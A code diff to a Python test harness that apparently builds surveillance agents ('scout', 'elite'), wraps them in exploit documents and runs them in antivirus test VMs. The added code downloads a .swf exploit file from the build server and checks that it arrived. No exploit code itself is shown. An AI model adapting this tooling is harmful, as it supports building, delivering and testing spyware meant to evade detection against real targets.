@@ -210,7 +210,7 @@ class VMAVTest:
                     {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit":"HT-2013-002", 
                     "melt":{"demo":False, "scout":True, "admin":False}}, 
                 "platform":"exploit", "deliver": {"user":"USERID"},
-                "melt":{"filename":"example.doc", "appname":"APPNAME", "input":"000", "url":"http://HOSTNAME/APPNAME" }, "factory":{"_id":"000"}
+                "melt":{"filename":"example.docx", "appname":"APPNAME", "input":"000", "url":"http://HOSTNAME/APPNAME" }, "factory":{"_id":"000"}
             }
 
             param = params[self.platform]
@@ -225,7 +225,7 @@ class VMAVTest:
                     print "- Melt build with: ", melt
                     appname = "exp_%s" % self.hostname
                     param['melt']['appname'] = appname
-                    param['melt']['url'] = "http://%s/%s" % (c.host, appname)
+                    param['melt']['url'] = "http://%s/%s/" % (c.host, appname)
                     if 'deliver' in param:
                         param['deliver']['user'] = c.myid
                     r = c.build_melt(factory, param, melt, filename)
@@ -445,7 +445,7 @@ class VMAVTest:
         meltfile = None
         if self.kind == 'melt':
             if self.platform == 'exploit_doc':
-                meltfile = 'assets/meltexploit.doc'
+                meltfile = 'assets/meltexploit.docx'
             elif self.platform == 'exploit':
                 meltfile = 'assets/meltexploit.txt'
             else:
@@ -453,10 +453,28 @@ class VMAVTest:
 
         exe = self._build_agent( factory_id, meltfile )
 
+        if self.platform == 'exploit_doc':
+            """ TODO: download """
+            appname = "exp_%s/avtest.swf" % self.hostname
+            url = "http://%s/%s" % (self.host[1], appname)
+            print "DBG getting: %s" % url
+            u = urllib2.urlopen(url)
+            localFile = open('build/file.swf', 'w')
+            localFile.write(u.read())
+            localFile.close()
+
+            try:
+               with open('build/file.swf'): 
+                    print "+ SUCCESS EXPLOIT"
+            except IOError:
+               print "+ ERROR EXPLOIT"
+     
+            pass
         return factory_id, ident, exe
 
 internet_checked = False
 def execute_agent(args, level, platform):
+    """ starts the vm and execute elite,scout or pull, depending on the level """
     global internet_checked
 
     ftype = args.platform_type[platform]
@@ -475,7 +493,7 @@ def execute_agent(args, level, platform):
     vmavtest = VMAVTest( args.backend, args.frontend , platform, args.kind, ftype, args.blacklist )
 
     if vmavtest.create_user_machine():
-        print "+ SUCCESS USER CONNET"
+        print "+ SUCCESS USER CONNECT"
         if not vmavtest.server_errors():
             print "+ SUCCESS SERVER CONNECT"
         
@@ -487,7 +505,7 @@ def execute_agent(args, level, platform):
          print "+ FAILED USER CREATE"
 
 def elite(args):
-    """ starts a scout """
+    """ starts a elite """
     execute_agent(args, "elite", args.platform)
 
 def scout(args):
@@ -495,7 +513,7 @@ def scout(args):
     execute_agent(args, "scout", args.platform)
 
 def pull(args):
-    """ starts a scout """
+    """ deploys one or all platforms ('windows', 'linux', 'osx', 'exploit', 'exploit_doc', 'android', 'blackberry', 'ios') """
     if args.platform == "all":
         res = True;
         for platform in args.platform_type.keys():
